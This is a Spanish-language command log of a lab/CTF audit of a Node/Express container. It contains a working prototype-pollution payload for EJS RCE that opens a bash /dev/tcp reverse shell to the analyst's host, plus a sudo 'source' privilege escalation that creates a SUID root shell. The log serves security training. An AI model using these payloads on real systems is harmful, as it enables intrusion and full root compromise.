# Registro de comandos — Auditoría LEVIATHAN

- **Fecha:** 2026-11-17 (America/Mexico_City)
- **Analista:** `chifay@kali` (`172.17.0.1`)
- **Objetivo:** `172.17.0.2` (contenedor `leviathan`, hostname `e27cbd55ae81`)

Todos los comandos de auditoría se ejecutaron desde una terminal Kali con el prompt:

```text
chifay@kali:~$
```

## 1. Reconocimiento

```bash
nmap -sT -Pn -p- --min-rate 5000 172.17.0.2
```

Resultado relevante:

```text
PORT   STATE SERVICE
80/tcp open  http
```

```bash
curl -s -i http://172.17.0.2/ | head -12
```

Encabezados relevantes:

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
```

```bash
curl -s http://172.17.0.2/api/profile | jq
```

```json
{
  "theme": "dark",
  "version": "1.0.4",
  "last_sync": "2026-11-18T00:04:58.999Z"
}
```

```bash
curl -s http://172.17.0.2/ | grep -nE "fetch|api/profile|Discovery"
```

```text
199:        // Discovery script for players
202:                const response = await fetch('/api/profile');
```

```bash
curl -s -i -X OPTIONS http://172.17.0.2/api/profile | head -8
```

```text
HTTP/1.1 200 OK
Allow: GET,HEAD,POST
```

La enumeración no reveló más rutas. El fingerprinting del motor de plantillas y
la confirmación de la fusión se hicieron por comportamiento, como se describe
en la sección 5 del writeup.

## 2. Explotación inicial — Prototype Pollution + EJS RCE

El gadget se confirmó primero con un marcador inocuo:

```bash
jq -cn --arg e "1;return 'LEVIATHAN_PP_MARKER';" \
  '{__proto__:{client:true,escapeFunction:$e}}' > /tmp/pp-marker.json
curl -s -X POST -H 'Content-Type: application/json' --data @/tmp/pp-marker.json \
  http://172.17.0.2/api/profile
curl -s http://172.17.0.2/
```

Respuesta:

```text
{"status":"Profile updated"}
LEVIATHAN_PP_MARKER
```

Generación del payload (CVE-2024-33883):

```bash
jq -cn --arg e "1;process.mainModule.require('child_process').execSync('bash -i>&/dev/tcp/172.17.0.1/4444 0>&1',{shell:'/bin/bash'});return '';" \
  '{__proto__:{client:true,escapeFunction:$e}}' > /tmp/pp.json
```

Contenido del payload:

```json
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1;process.mainModule.require('child_process').execSync('bash -i>&/dev/tcp/172.17.0.1/4444 0>&1',{shell:'/bin/bash'});return '';"
  }
}
```

Envío al endpoint vulnerable:

```bash
curl -s -X POST -H 'Content-Type: application/json' --data @/tmp/pp.json \
  http://172.17.0.2/api/profile
```

Respuesta:

```json
{"status":"Profile updated"}
```

Listener en Kali:

```bash
nc -lvnp 4444
```

Disparo del render de EJS (la petición queda bloqueada mientras el reverse shell está activo):

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://172.17.0.2/
```

Conexión recibida:

```text
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39934
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
leviathan@e27cbd55ae81:/app$
```

## 3. Post-explotación — Flag de usuario

Ya con shell como `leviathan`, se leyeron los archivos para confirmar la causa
raíz:

```bash
cat /app/server.js
grep -A4 '"dependencies"' /app/package.json
```

Dependencias relevantes:

```json
"ejs": "3.1.9"
```

```bash
id; hostname; uname -a; pwd
```

```text
uid=1000(leviathan) gid=1000(leviathan) groups=1000(leviathan)
e27cbd55ae81
Linux e27cbd55ae81 7.2.15+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.2.15-1kali1 (2026-11-03) x86_64 GNU/Linux
/app
```

> `uname -a` muestra el kernel del host porque el contenedor Docker comparte el kernel de Kali; el hostname y el UID corresponden al contenedor.

```bash
ls -la /home/leviathan; cat /home/leviathan/user.txt
```

```text
-r-------- 1 leviathan leviathan 35 Apr 15  2026 user.txt
Leviathan{REDACTED}
```

## 4. Escalada de privilegios

```bash
sudo -l
```

```text
User leviathan may run the following commands on e27cbd55ae81:
    (root) NOPASSWD: /opt/scripts/backup.sh
```

```bash
cat /opt/scripts/backup.sh
```

Fragmento clave:

```bash
if [ -f /home/leviathan/.backup_config ]; then
    source /home/leviathan/.backup_config
fi
```

El script se ejecuta como root vía sudo y hace `source` de un archivo controlado por `leviathan`.

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > ~/.backup_config
cat ~/.backup_config
```

```text
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
```

```bash
sudo /opt/scripts/backup.sh
ls -l /tmp/rootbash
```

```text
Backup completed.
-rwsr-sr-x 1 root root 1234376 Nov 18 00:16 /tmp/rootbash
```

```bash
/tmp/rootbash -p
id; whoami
```

```text
uid=1000(leviathan) gid=1000(leviathan) euid=0(root) egid=0(root) groups=0(root),1000(leviathan)
root
```

```bash
cat /root/root.txt
```

```text
Leviathan{REDACTED}
```

## 5. Limpieza y restauración del laboratorio

Desde el shell root del objetivo:

```bash
rm -f /tmp/rootbash /home/leviathan/.backup_config /tmp/backup.log
rm -rf /tmp/backups
```

Restauración del prototipo contaminado en el proceso Node (se envió un nuevo
`escapeFunction` que elimina las propiedades inyectadas y retorna sin ejecutar
una shell):

```bash
jq -cn --arg e "1;delete Object.prototype.client;delete Object.prototype.escapeFunction;delete Object.prototype.theme;delete Object.prototype.x;return '';" \
  '{__proto__:{client:true,escapeFunction:$e}}' > /tmp/clean.json
curl -s -X POST -H 'Content-Type: application/json' --data @/tmp/clean.json \
  http://172.17.0.2/api/profile
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://172.17.0.2/
```

Verificación posterior:

```bash
curl -s http://172.17.0.2/ | head -3
curl -s http://172.17.0.2/api/profile
curl -s -X POST -H 'Content-Type: application/json' -d '{"theme":"dark"}' \
  http://172.17.0.2/api/profile
```

Salidas esperadas:

```text
<!DOCTYPE html>
<html lang="en">
<head>
{"theme":"dark","version":"1.0.4","last_sync":"..."}
{"status":"Profile updated"}
```
